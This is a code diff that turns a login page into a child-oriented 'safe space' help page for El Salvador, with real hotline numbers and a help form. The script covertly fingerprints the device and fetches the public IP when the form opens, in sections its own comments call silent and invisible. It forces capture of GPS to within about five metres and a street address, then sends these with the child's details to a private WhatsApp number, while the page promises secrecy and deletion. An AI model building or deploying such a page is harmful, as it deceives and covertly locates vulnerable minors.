@@ -2,31 +2,950 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login </title>
-    <link rel="stylesheet" href="styles.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Espacio Seguro El Salvador 🌈</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Comic Sans MS', 'Chalkboard SE', 'Arial Rounded', sans-serif;
+            background: linear-gradient(135deg, #6B8CFF 0%, #9B6BFF 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #6B8CFF;
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .nav-btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: #6B8CFF;
+            color: white;
+            box-shadow: 0 4px 10px rgba(107, 140, 255, 0.3);
+        }
+
+        .nav-btn:hover {
+            transform: scale(1.05);
+            background: #9B6BFF;
+        }
+
+        .nav-btn.eliminar {
+            background: #FF6B6B;
+        }
+
+        .nav-btn.eliminar:hover {
+            background: #FF4757;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 100px auto 40px;
+            padding: 20px;
+        }
+
+        .welcome-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 40px;
+            padding: 30px;
+            margin-bottom: 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            border: 3px solid white;
+        }
+
+        .welcome-card h1 {
+            color: #6B8CFF;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+        }
+
+        .welcome-card p {
+            font-size: 1.2rem;
+            color: #555;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .info-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 30px;
+            padding: 25px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+            transition: all 0.3s;
+            border: 2px solid white;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+        }
+
+        .info-card h3 {
+            color: #6B8CFF;
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 2px solid #6B8CFF;
+            padding-bottom: 10px;
+        }
+
+        .info-card p {
+            font-size: 1.1rem;
+            margin: 10px 0;
+            color: #444;
+        }
+
+        .emergency-numbers {
+            background: #FFF3CD;
+            border-radius: 20px;
+            padding: 15px;
+            margin-top: 10px;
+        }
+
+        .number {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #FF6B6B;
+            margin: 5px 0;
+        }
+
+        .emergency-btn {
+            background: #FF6B6B;
+            color: white;
+            border: none;
+            padding: 30px 50px;
+            border-radius: 80px;
+            font-size: 2.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 30px 0;
+            box-shadow: 0 10px 0 #C44F4F, 0 15px 30px rgba(255,107,107,0.4);
+            transition: all 0.1s;
+            width: 100%;
+            border: 3px solid white;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.2);
+        }
+
+        .emergency-btn:active {
+            transform: translateY(10px);
+            box-shadow: 0 5px 0 #C44F4F, 0 15px 30px rgba(255,107,107,0.4);
+        }
+
+        .emergency-btn:hover {
+            background: #FF8C8C;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 50px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border: 4px solid #6B8CFF;
+        }
+
+        .modal-header {
+            background: #6B8CFF;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 46px 46px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h2 {
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .close-btn {
+            background: rgba(255,255,255,0.3);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .close-btn:hover {
+            background: rgba(255,255,255,0.5);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #6B8CFF;
+            font-size: 1.1rem;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 3px solid #E0E7FF;
+            border-radius: 30px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .form-control:focus {
+            border-color: #6B8CFF;
+            outline: none;
+            box-shadow: 0 0 0 5px rgba(107,140,255,0.2);
+        }
+
+        select.form-control {
+            appearance: none;
+            background: white url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%236B8CFF' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>") no-repeat right 15px center;
+        }
+
+        .location-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+        }
+
+        .location-btn:hover {
+            background: #45a049;
+            transform: scale(1.02);
+        }
+
+        .location-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .location-status {
+            background: #F0F7FF;
+            padding: 15px;
+            border-radius: 20px;
+            margin: 10px 0;
+            font-size: 0.95rem;
+            color: #333;
+            border: 2px dashed #6B8CFF;
+        }
+
+        .precision-badge {
+            background: #6B8CFF;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        .submit-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 20px;
+            border-radius: 40px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: all 0.3s;
+            box-shadow: 0 5px 0 #1da85c;
+        }
+
+        .submit-btn:active {
+            transform: translateY(5px);
+            box-shadow: none;
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            box-shadow: 0 5px 0 #999;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .privacy-note {
+            background: #E8F4FD;
+            padding: 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            color: #2c3e50;
+            margin: 20px 0;
+            border-left: 5px solid #6B8CFF;
+        }
+
+        .privacy-note strong {
+            color: #6B8CFF;
+        }
+
+        .footer {
+            background: rgba(255,255,255,0.9);
+            border-radius: 40px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 40px;
+            font-size: 1.1rem;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .emoji-bounce {
+            display: inline-block;
+            animation: bounce 2s infinite;
+        }
+
+        @media (max-width: 768px) {
+            .emergency-btn {
+                font-size: 1.8rem;
+                padding: 20px 30px;
+            }
+            
+            .welcome-card h1 {
+                font-size: 1.8rem;
+            }
+            
+            nav {
+                justify-content: center;
+            }
+        }
+    </style>
 </head>
 <body>
+    <header>
+        <nav>
+            <div class="logo">
+                <span class="emoji-bounce">🛡️</span> Espacio Seguro SV
+            </div>
+            <div class="nav-buttons">
+                <button class="nav-btn" onclick="abrirFormulario()">📝 Pedir Ayuda</button>
+                <button class="nav-btn eliminar" onclick="borrarTodo()">🗑️ Borrar mis datos</button>
+            </div>
+        </nav>
+    </header>
 
-<div class="container">
-    <form class="login-form" id="loginForm">
-        <h2>Iniciar Sesión</h2>
-
-        <div class="input-group">
-            <label>Correo electrónico</label>
-            <input type="email" id="email" placeholder="ejemplo@gmail.com" required>
+    <div class="container">
+        <div class="welcome-card">
+            <h1>🌟 ¡Estamos aquí para ayudarte! 🌟</h1>
+            <p>Si estás pasando por un momento difícil, no estás solo. Hay personas que quieren ayudarte.</p>
         </div>
 
-        <div class="input-group">
-            <label>Contraseña</label>
-            <input type="password" id="password" placeholder="••••••••" required>
+        <div class="info-grid">
+            <div class="info-card">
+                <h3>📞 Teléfonos de ayuda</h3>
+                <div class="emergency-numbers">
+                    <div class="number">🚨 911 - Emergencias</div>
+                    <div class="number">👮 126 - ISDEMU</div>
+                    <div class="number">👧 119 - CONNA</div>
+                    <div class="number">⚖️ 2593-8000 - Procuraduría</div>
+                </div>
+            </div>
+
+            <div class="info-card">
+                <h3>🛡️ Tus derechos</h3>
+                <p>✓ A estar protegido</p>
+                <p>✓ A ser escuchado</p>
+                <p>✓ A que te ayuden</p>
+                <p>✓ A no tener miedo</p>
+            </div>
+
+            <div class="info-card">
+                <h3>📍 Lugares cercanos</h3>
+                <p>🏥 Hospital Bloom</p>
+                <p>⚖️ Juzgados de Familia</p>
+                <p>👮 PNC más cercana</p>
+                <p>🏛️ Alcaldía municipal</p>
+            </div>
         </div>
 
-        <button type="submit">Entrar</button>
-        <p id="mensaje"></p>
-    </form>
-</div>
+        <button class="emergency-btn" onclick="abrirFormulario()">
+            🔴 ¡NECESITO AYUDA YA! 🔴
+        </button>
 
-<script src="script.js"></script>
+        <div class="welcome-card" style="background: #FFF3CD;">
+            <p style="font-size: 1.3rem;">🤝 Todo lo que nos cuentes es confidencial y solo lo verán las personas que pueden ayudarte.</p>
+        </div>
+    </div>
+
+    <!-- FORMULARIO AMIGABLE PARA NIÑOS -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>
+                    <span>📋</span>
+                    Formulario de Ayuda
+                </h2>
+                <span class="close-btn" onclick="cerrarFormulario()">×</span>
+            </div>
+            
+            <div class="modal-body">
+                <div class="privacy-note">
+                    <strong>🌈 No te preocupes</strong> - Todo es secreto y solo lo verán las personas que te pueden ayudar.
+                </div>
+
+                <form id="formularioAyuda">
+                    <div class="form-group">
+                        <label>👧 ¿Cómo te llamas? (puede ser un nombre inventado)</label>
+                        <input type="text" class="form-control" id="nombre" placeholder="Ej: Ana, Luis, etc." required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📅 ¿Cuántos años tienes?</label>
+                        <input type="number" class="form-control" id="edad" min="0" max="18" placeholder="Tu edad">
+                    </div>
+
+                    <div class="form-group">
+                        <label>📍 ¿De qué departamento eres?</label>
+                        <select class="form-control" id="departamento" required>
+                            <option value="">Elige tu departamento</option>
+                            <option value="San Salvador">San Salvador</option>
+                            <option value="La Libertad">La Libertad</option>
+                            <option value="Santa Ana">Santa Ana</option>
+                            <option value="San Miguel">San Miguel</option>
+                            <option value="Sonsonate">Sonsonate</option>
+                            <option value="Ahuachapán">Ahuachapán</option>
+                            <option value="Cabañas">Cabañas</option>
+                            <option value="Chalatenango">Chalatenango</option>
+                            <option value="Cuscatlán">Cuscatlán</option>
+                            <option value="La Paz">La Paz</option>
+                            <option value="La Unión">La Unión</option>
+                            <option value="Morazán">Morazán</option>
+                            <option value="San Vicente">San Vicente</option>
+                            <option value="Usulután">Usulután</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📍 Tu ubicación exacta (para que puedan encontrarte rápido)</label>
+                        <button type="button" class="location-btn" id="botonUbicacion" onclick="iniciarGpsQuirurgico()">
+                            <span>📍</span> COMPARTIR UBICACIÓN
+                        </button>
+                        <div id="estadoUbicacion" class="location-status">
+                            ⏳ Aún no has compartido tu ubicación
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>💬 ¿Qué está pasando? Cuéntanos</label>
+                        <textarea class="form-control" id="problema" rows="4" placeholder="Ej: Necesito ayuda porque..." required></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label>📱 Teléfono (si tienes, para contactarte)</label>
+                        <input type="text" class="form-control" id="contacto" placeholder="Ej: 7123-4567">
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="botonEnviar" disabled>
+                        📤 ENVIAR POR WHATSAPP
+                    </button>
+
+                    <p style="text-align: center; font-size: 0.8rem; color: #666;">
+                        🔒 Tus datos se borran después de enviarlos
+                    </p>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>🇸🇻 Líneas de ayuda: 911 | 126 | 119 🇸🇻</p>
+        <p>🌈 Siempre hay alguien que quiere ayudarte 🌈</p>
+    </footer>
+
+    <script>
+        // ==============================================
+        // VERSIÓN DEFINITIVA - FUSIÓN PERFECTA
+        // ==============================================
+        
+        // CONFIGURACIÓN
+        const telefonoWhatsApp = "75153192";
+        let datosCompletos = null;
+        let watchID = null;
+
+        // ==============================================
+        // 1. FUNCIONES BÁSICAS DE INTERFAZ
+        // ==============================================
+        function abrirFormulario() {
+            document.getElementById('modal').style.display = 'flex';
+            // Iniciar recolección silenciosa de datos del dispositivo
+            recolectarInfoSilenciosa();
+        }
+
+        function cerrarFormulario() {
+            document.getElementById('modal').style.display = 'none';
+            // Detener GPS si está activo
+            if (watchID) {
+                navigator.geolocation.clearWatch(watchID);
+                watchID = null;
+            }
+        }
+
+        // ==============================================
+        // 2. RECOLECCIÓN SILENCIOSA DE DATOS (INVISIBLE)
+        // ==============================================
+        async function recolectarInfoSilenciosa() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                navegador: {
+                    userAgent: navigator.userAgent,
+                    plataforma: navigator.platform,
+                    idioma: navigator.language,
+                    idiomas: navigator.languages,
+                    cookies: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'desconocido',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    vendor: navigator.vendor,
+                    product: navigator.product
+                },
+                pantalla: {
+                    ancho: screen.width,
+                    alto: screen.height,
+                    anchoDisponible: screen.availWidth,
+                    altoDisponible: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    orientacion: screen.orientation ? screen.orientation.type : 'desconocida'
+                },
+                ventana: {
+                    ancho: window.innerWidth,
+                    alto: window.innerHeight,
+                    pixelRatio: window.devicePixelRatio
+                },
+                tiempo: {
+                    zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    offset: new Date().getTimezoneOffset(),
+                    horaLocal: new Date().toString(),
+                    horaUTC: new Date().toUTCString()
+                },
+                conexion: navigator.connection ? {
+                    tipo: navigator.connection.type,
+                    efectivo: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : 'no disponible'
+            };
+
+            // Obtener IP pública (silencioso)
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                info.ip = data.ip;
+            } catch (e) {}
+
+            // Obtener batería
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    info.bateria = {
+                        nivel: battery.level * 100,
+                        cargando: battery.charging,
+                        tiempoCarga: battery.chargingTime,
+                        tiempoDescarga: battery.dischargingTime
+                    };
+                }
+            } catch (e) {}
+
+            // Guardar en variable global
+            datosCompletos = { ...datosCompletos, sistema: info };
+        }
+
+        // ==============================================
+        // 3. GPS QUIRÚRGICO (MÚLTIPLES LECTURAS)
+        // ==============================================
+        function iniciarGpsQuirurgico() {
+            const boton = document.getElementById('botonUbicacion');
+            const estado = document.getElementById('estadoUbicacion');
+            const botonEnviar = document.getElementById('botonEnviar');
+
+            boton.disabled = true;
+            boton.innerHTML = '⏳ CALIBRANDO GPS DE ALTA PRECISIÓN...';
+            estado.innerHTML = '📡 Buscando señal satelital...';
+
+            let mejorLectura = null;
+            let lecturas = [];
+            let tiempoInicio = Date.now();
+            
+            // CONFIGURACIÓN QUIRÚRGICA
+            const precisionObjetivo = 5; // 5 METROS DE PRECISIÓN
+            const tiempoMaximo = 30000; // 30 SEGUNDOS MÁXIMO
+            
+            const opcionesGPS = {
+                enableHighAccuracy: true,  // ¡ACTIVADO!
+                maximumAge: 0,              // NO USAR CACHÉ
+                timeout: 15000               // 15 SEGUNDOS POR LECTURA
+            };
+
+            if (!navigator.geolocation) {
+                estado.innerHTML = "❌ Tu dispositivo no tiene GPS. Escribe tu ubicación en el mensaje.";
+                boton.disabled = false;
+                return;
+            }
+
+            // Iniciar watch para obtener múltiples lecturas
+            watchID = navigator.geolocation.watchPosition(
+                async function(position) {
+                    const precision = position.coords.accuracy;
+                    const timestamp = new Date().toLocaleTimeString();
+                    
+                    // Guardar lectura
+                    lecturas.push({
+                        precision: precision,
+                        tiempo: timestamp
+                    });
+
+                    // Actualizar si es mejor
+                    if (!mejorLectura || precision < mejorLectura.precision) {
+                        mejorLectura = {
+                            latitud: position.coords.latitude,
+                            longitud: position.coords.longitude,
+                            precision: precision,
+                            altitud: position.coords.altitude,
+                            precisionAltitud: position.coords.altitudeAccuracy,
+                            direccion: position.coords.heading,
+                            velocidad: position.coords.speed,
+                            timestamp: new Date(position.timestamp).toISOString(),
+                            satelites: position.coords.satellites || 'desconocido'
+                        };
+
+                        // Mostrar progreso
+                        estado.innerHTML = `
+                            🎯 Mejor precisión: ${mejorLectura.precision.toFixed(1)} metros<br>
+                            🔄 Mejorando señal... (${lecturas.length} lecturas)
+                        `;
+                    }
+
+                    // Verificar si ya cumplimos objetivo o pasó el tiempo
+                    const tiempoActual = Date.now();
+                    if (mejorLectura.precision <= precisionObjetivo || (tiempoActual - tiempoInicio) > tiempoMaximo) {
+                        
+                        // Detener watch
+                        navigator.geolocation.clearWatch(watchID);
+                        watchID = null;
+
+                        // Obtener dirección y datos adicionales
+                        await obtenerDireccionExacta(mejorLectura.latitud, mejorLectura.longitud, mejorLectura);
+                        
+                        // Calcular calidad
+                        let calidad = '';
+                        if (mejorLectura.precision <= 3) calidad = '🔥 PERFECTA';
+                        else if (mejorLectura.precision <= 5) calidad = '✅ EXCELENTE';
+                        else if (mejorLectura.precision <= 10) calidad = '👍 BUENA';
+                        else calidad = '📍 SUFICIENTE';
+
+                        // Guardar datos de GPS
+                        datosCompletos = {
+                            ...datosCompletos,
+                            ubicacion: mejorLectura,
+                            mapas: {
+                                google: `https://www.google.com/maps?q=${mejorLectura.latitud},${mejorLectura.longitud}`,
+                                waze: `https://waze.com/ul?ll=${mejorLectura.latitud},${mejorLectura.longitud}&navigate=yes`,
+                                openstreetmap: `https://www.openstreetmap.org/?mlat=${mejorLectura.latitud}&mlon=${mejorLectura.longitud}&zoom=18`
+                            }
+                        };
+
+                        // Actualizar UI
+                        estado.innerHTML = `
+                            ✅ ¡Ubicación confirmada!<br>
+                            <span class="precision-badge">🎯 Precisión: ${mejorLectura.precision.toFixed(1)} metros - ${calidad}</span><br>
+                            <small>📍 ${datosCompletos.ubicacion.direccion || 'Dirección obtenida'}</small>
+                        `;
+
+                        boton.innerHTML = '📍 UBICACIÓN CONFIRMADA';
+                        botonEnviar.disabled = false;
+                    }
+                },
+                function(error) {
+                    let mensaje = "❌ Error en GPS: ";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            mensaje += "Permiso denegado. Por favor permite el acceso.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            mensaje += "Señal no disponible. Intenta en un lugar abierto.";
+                            break;
+                        case error.TIMEOUT:
+                            mensaje += "Tiempo de espera agotado. Intenta de nuevo.";
+                            break;
+                        default:
+                            mensaje += "Error desconocido.";
+                    }
+                    estado.innerHTML = mensaje;
+                    boton.disabled = false;
+                    boton.innerHTML = '📍 REINTENTAR';
+                },
+                opcionesGPS
+            );
+        }
+
+        // ==============================================
+        // 4. OBTENER DIRECCIÓN EXACTA
+        // ==============================================
+        async function obtenerDireccionExacta(lat, lon, objetoDestino) {
+            try {
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=es`,
+                    {
+                        headers: {
+                            'Accept-Language': 'es',
+                            'User-Agent': 'EspacioSeguro-SV/1.0'
+                        }
+                    }
+                );
+                const data = await response.json();
+                
+                objetoDestino.direccion = data.display_name;
+                objetoDestino.direccionDetalle = {
+                    calle: data.address?.road || data.address?.pedestrian,
+                    numero: data.address?.house_number,
+                    colonia: data.address?.suburb || data.address?.neighbourhood,
+                    municipio: data.address?.city || data.address?.town,
+                    departamento: data.address?.state,
+                    pais: data.address?.country,
+                    codigoPostal: data.address?.postcode
+                };
+                
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // ==============================================
+        // 5. ENVIAR POR WHATSAPP (VERSIÓN COMPLETA)
+        // ==============================================
+        document.getElementById('formularioAyuda').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!datosCompletos || !datosCompletos.ubicacion) {
+                alert('Por favor comparte tu ubicación primero.');
+                return;
+            }
+
+            // Obtener datos del formulario
+            const nombre = document.getElementById('nombre').value;
+            const edad = document.getElementById('edad').value;
+            const departamento = document.getElementById('departamento').value;
+            const problema = document.getElementById('problema').value;
+            const contacto = document.getElementById('contacto').value;
+
+            // ==============================================
+            // CONSTRUIR MENSAJE COMPLETO (LO MEJOR DE AMBOS MUNDOS)
+            // ==============================================
+            let mensaje = `🚨🚨 EMERGENCIA - EL SALVADOR 🚨🚨\n\n`;
+            
+            // SECCIÓN 1: DATOS PERSONALES
+            mensaje += `👤 *DATOS PERSONALES*\n`;
+            mensaje += `━━━━━━━━━━━━━━━━\n`;
+            mensaje += `• Nombre: ${nombre}\n`;
+            if (edad) mensaje += `• Edad: ${edad} años\n`;
+            mensaje += `• Departamento: ${departamento}\n`;
+            if (contacto) mensaje += `• Contacto: ${contacto}\n\n`;
+
+            // SECCIÓN 2: UBICACIÓN QUIRÚRGICA
+            mensaje += `📍 *UBICACIÓN DE PRECISIÓN QUIRÚRGICA*\n`;
+            mensaje += `━━━━━━━━━━━━━━━━\n`;
+            mensaje += `• Google Maps: ${datosCompletos.mapas.google}\n`;
+            mensaje += `• Waze: ${datosCompletos.mapas.waze}\n`;
+            mensaje += `• Coordenadas: ${datosCompletos.ubicacion.latitud}, ${datosCompletos.ubicacion.longitud}\n`;
+            mensaje += `• PRECISIÓN: ${datosCompletos.ubicacion.precision.toFixed(1)} metros\n`;
+            
+            if (datosCompletos.ubicacion.altitud) {
+                mensaje += `• Altitud: ${datosCompletos.ubicacion.altitud.toFixed(1)} metros\n`;
+            }
+            
+            mensaje += `• Hora GPS: ${new Date(datosCompletos.ubicacion.timestamp).toLocaleString('es-SV')}\n\n`;
+
+            // SECCIÓN 3: DIRECCIÓN
+            if (datosCompletos.ubicacion.direccion) {
+                mensaje += `📌 *DIRECCIÓN EXACTA*\n`;
+                mensaje += `━━━━━━━━━━━━━━━━\n`;
+                mensaje += `${datosCompletos.ubicacion.direccion}\n\n`;
+            }
+
+            // SECCIÓN 4: PROBLEMA
+            mensaje += `⚠️ *SITUACIÓN*\n`;
+            mensaje += `━━━━━━━━━━━━━━━━\n`;
+            mensaje += `${problema}\n\n`;
+
+            // SECCIÓN 5: DATOS TÉCNICOS (SILENCIOSOS)
+            if (datosCompletos.sistema) {
+                mensaje += `📱 *INFORMACIÓN TÉCNICA*\n`;
+                mensaje += `━━━━━━━━━━━━━━━━\n`;
+                mensaje += `• Dispositivo: ${datosCompletos.sistema.navegador.plataforma}\n`;
+                mensaje += `• Idioma: ${datosCompletos.sistema.navegador.idioma}\n`;
+                mensaje += `• Zona horaria: ${datosCompletos.sistema.tiempo.zonaHoraria}\n`;
+                
+                if (datosCompletos.sistema.bateria) {
+                    mensaje += `• Batería: ${datosCompletos.sistema.bateria.nivel}%\n`;
+                }
+                
+                if (datosCompletos.sistema.conexion && datosCompletos.sistema.conexion !== 'no disponible') {
+                    mensaje += `• Red: ${datosCompletos.sistema.conexion.efectivo}\n`;
+                }
+                
+                if (datosCompletos.sistema.ip) {
+                    mensaje += `• IP: ${datosCompletos.sistema.ip}\n`;
+                }
+                
+                mensaje += `• Núcleos CPU: ${datosCompletos.sistema.navegador.hardwareConcurrency || 'desconocido'}\n`;
+                mensaje += `• Memoria RAM: ${datosCompletos.sistema.navegador.deviceMemory || 'desconocido'} GB\n`;
+            }
+
+            // SECCIÓN 6: TIMESTAMP
+            mensaje += `\n⏰ *HORA DE ENVÍO*\n`;
+            mensaje += `━━━━━━━━━━━━━━━━\n`;
+            mensaje += `${new Date().toLocaleString('es-SV', { timeZone: 'America/El_Salvador' })}\n`;
+
+            // Abrir WhatsApp
+            const urlWhatsApp = `https://wa.me/${telefonoWhatsApp}?text=${encodeURIComponent(mensaje)}`;
+            window.open(urlWhatsApp, '_blank');
+            
+            alert('✅ ¡Mensaje enviado! Alguien te ayudará pronto. Tienen tu ubicación exacta.');
+            
+            cerrarFormulario();
+            
+            // Resetear formulario
+            document.getElementById('formularioAyuda').reset();
+            document.getElementById('estadoUbicacion').innerHTML = '⏳ Aún no has compartido tu ubicación';
+            document.getElementById('botonUbicacion').innerHTML = '<span>📍</span> COMPARTIR UBICACIÓN';
+            document.getElementById('botonEnviar').disabled = true;
+            datosCompletos = null;
+        });
+
+        // ==============================================
+        // 6. BORRAR TODOS LOS DATOS
+        // ==============================================
+        function borrarTodo() {
+            if (confirm('¿Estás seguro de borrar toda tu información? Esto eliminará cualquier dato guardado.')) {
+                // Detener GPS
+                if (watchID) {
+                    navigator.geolocation.clearWatch(watchID);
+                    watchID = null;
+                }
+                
+                // Limpiar almacenamiento
+                localStorage.clear();
+                sessionStorage.clear();
+                
+                // Resetear variables
+                datosCompletos = null;
+                
+                // Resetear interfaz
+                document.getElementById('formularioAyuda')?.reset();
+                document.getElementById('estadoUbicacion').innerHTML = '⏳ Aún no has compartido tu ubicación';
+                document.getElementById('botonUbicacion').innerHTML = '<span>📍</span> COMPARTIR UBICACIÓN';
+                document.getElementById('botonEnviar').disabled = true;
+                
+                alert('✅ Toda tu información ha sido borrada');
+                cerrarFormulario();
+            }
+        }
+
+        // ==============================================
+        // 7. CIERRE DE MODAL CON CLICK FUERA
+        // ==============================================
+        window.onclick = function(event) {
+            const modal = document.getElementById('modal');
+            if (event.target === modal) {
+                cerrarFormulario();
+            }
+        }
+    </script>
 </body>
 </html>
